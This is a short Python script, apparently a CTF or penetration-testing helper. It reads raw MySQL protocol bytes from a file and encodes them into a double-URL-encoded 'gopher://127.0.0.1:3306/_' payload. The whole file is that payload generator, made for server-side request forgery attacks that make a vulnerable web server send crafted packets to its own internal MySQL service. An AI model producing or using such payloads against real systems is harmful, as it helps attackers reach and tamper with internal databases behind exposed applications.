import sys
from urllib import parse
def results(s):
    a=""
    for i in s:
        tmp=hex(i)[2:]
        if len(tmp)!=2:
            tmp='0'+tmp
        a+="%25"+tmp
    return "gopher://127.0.0.1:3306/_"+a
if __name__=="__main__":
    
    with open("data","rb") as f:
        s=f.read()
    print(results(s))